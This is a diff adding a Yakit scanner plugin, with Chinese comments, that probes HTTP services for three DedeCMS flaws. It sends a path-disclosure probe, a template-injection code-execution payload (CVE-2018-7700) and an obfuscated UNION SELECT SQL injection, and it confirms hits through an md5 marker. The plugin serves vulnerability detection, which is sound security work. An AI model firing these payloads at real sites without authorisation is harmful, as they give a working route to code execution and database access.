@@ -1,0 +1,111 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// 准备发送的报文模版 
+PacketGet = `GET {{params(payload)}} HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+`
+
+
+
+//漏洞检测规则函数 
+rules = []
+addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "packet": packet,
+        "payload": payload,
+        "check": check,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+
+//填充对应的漏洞检测规则
+addRule(PacketGet,`/include/downmix.inc.php`,func(rsp,header,body){
+    if rsp.StatusCode == 200 &&  str.MatchAllOfSubString(body, `Fatal error`,`downmix.inc.php`,`Call to undefined function helper()`){
+        return true
+    }
+    return false
+},"信息泄露","dedecms-cve-2018-6910","low","https://github.com/kongxin520/DedeCMS/blob/master/DedeCMS_5.7_Bug.md")
+
+
+num = fuzz.Strings("{{ri(2000000000, 2100000000,1)}}")[0]
+addRule(PacketGet,`/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5`+num+`;{/dede:field}`,func(rsp,header,body){
+    if rsp.StatusCode == 200 &&  str.MatchAllOfSubString(body, codec.Md5(num)){
+        return true
+    }
+    return false
+},"命令执行","dedecms-cve-2018-7700-rce","critical","https://xz.aliyun.com/t/2224")
+
+
+addRule(PacketGet,"/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5("+num+")+--+@`'`",func(rsp,header,body){
+    if rsp.StatusCode == 200 &&  str.MatchAllOfSubString(body, codec.Md5(num)){
+        return true
+    }
+    return false
+},"sql注入","dedecms-membergroup-sqli","high","http://www.dedeyuan.com/xueyuan/wenti/1244.html")
+
+
+//漏洞检测handle 
+handleRule = func(swg, isTls, addr, rule) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        defer func{
+            recover()
+        }
+
+        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}))
+        if err != nil {
+            yakit.Error("poc.HTTP error: %v", err)
+            return
+        }
+        header, body = poc.Split(resp)
+        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
+        url = urlIns.String()
+        if rule.check(rspIns, header, body) {
+            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
+            risk.NewRisk(
+                url, risk.severity(rule.severity), 
+                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
+                risk.titleVerbose(sprintf("reference %v", rule.reference)),
+                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
+                risk.payload(rule.payload), risk.details({
+                    "request": req,
+                    "response": resp,
+                    "url": url,
+                }),
+            )
+            return
+        }
+        return
+    }
+}
+
+
+handle = func(result) {
+    if !result.IsOpen() {
+        return
+    }
+
+    //判断是否是http
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+
+    addr = str.HostPort(result.Target, result.Port)
+    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
+ 
+    //漏洞检测
+    swg = sync.NewSizedWaitGroup(10)
+    for _, rule = range rules {
+        handleRule(swg, isTls, addr, rule)
+    }
+    swg.Wait()
+}
